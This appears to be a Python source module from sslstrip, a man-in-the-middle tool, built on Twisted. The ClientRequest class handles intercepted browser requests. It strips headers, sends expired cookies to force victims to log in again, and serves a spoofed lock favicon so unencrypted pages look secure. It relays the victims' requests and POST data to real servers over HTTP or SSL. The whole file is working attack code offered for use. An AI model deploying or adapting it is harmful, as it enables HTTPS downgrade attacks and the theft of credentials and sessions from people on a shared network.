# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse, logging, os

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we don't like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.channel       = channel
        self.urlMonitor    = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        if 'keep-alive' in headers:
            del headers['keep-alive']

        if 'connection' in headers:
            del headers['connection']

        if 'if-modified-since' in headers:
            del headers['if-modified-since']
        
        headers['connection'] = 'close'

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

    def getPathToLockIcon(self):
        if os.path.exists("lock.ico"): return "lock.ico"

        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
        scriptPath = scriptPath + "../share/sslstrip/lock.ico"

        if os.path.exists(scriptPath): return scriptPath

        logging.warning("Error: Could not found lock.ico")
        return "lock.ico"        

    def process(self):
        headers           = self.cleanHeaders()
        host              = self.getHeader('host')
        client            = self.getClientIP()
        path              = self.getPathFromUri()
        self.content.seek(0,0)
        postData          = self.content.read()

        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
            logging.debug("Sending expired cookies...")
            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client, host, headers, path))
        elif (self.urlMonitor.isSecureFavicon(client, path)):
            logging.debug("Sending spoofed favicon response...")
            self.sendSpoofedFaviconResponse()
        elif (self.urlMonitor.isSecureLink(client, 'http://' + host + path)):
            logging.debug("Sending request via SSL...")
            self.proxyViaSSL(host, self.method, path, postData, headers)
        else:
            logging.debug("Sending request via HTTP...")
            self.proxyViaHTTP(host, self.method, path, postData, headers)

    def proxyViaHTTP(self, host, method, path, postData, headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers):
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, 443, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.transport.write("HTTP/1.0 302 Moved\r\n")
        self.transport.write("connection: close\r\n")
        self.transport.write("Location: http://" + host + path + "\r\n")
        
        for header in expireHeaders:
            self.transport.write(header)
            
        self.transport.write("\r\n")
        self.transport.loseConnection()
        
        
    def sendSpoofedFaviconResponse(self):
        icoFile = open(self.getPathToLockIcon())
        
        self.transport.write("HTTP/1.0 200 OK\r\n")
        self.transport.write("Content-type: image/x-icon\r\n\r\n")
        self.transport.write(icoFile.read())
        
        icoFile.close()
        self.transport.loseConnection()
